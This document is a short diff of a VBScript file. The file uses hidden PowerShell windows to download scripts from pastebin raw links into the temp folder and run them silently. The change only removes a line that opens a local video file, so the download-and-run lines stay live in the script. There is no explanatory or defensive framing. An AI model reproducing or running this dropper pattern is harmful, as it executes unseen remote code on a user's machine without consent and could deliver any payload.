@@ -29,8 +29,6 @@ WScript.Sleep 1200
 WshShell.Run "powershell -w hidden -c ""(New-Object Net.WebClient).DownloadFile('https://pastebin.com/raw/NfhDWkdS','%TEMP%\mousemove.vbs'); Start-Process '%TEMP%\mousemove.vbs'""", 0, False
 WScript.Sleep 500
 
-WshShell.Run """C:\Users\jurri\Downloads\kosovo.mp4.mp4"""
-
 WshShell.Run "powershell -w hidden -c ""(New-Object Net.WebClient).DownloadFile('https://pastebin.com/raw/tLYqCwJQ','%TEMP%\soundloop.vbs')""", 0, True
 WshShell.Run "wscript.exe %TEMP%\soundloop.vbs", 0, False
 
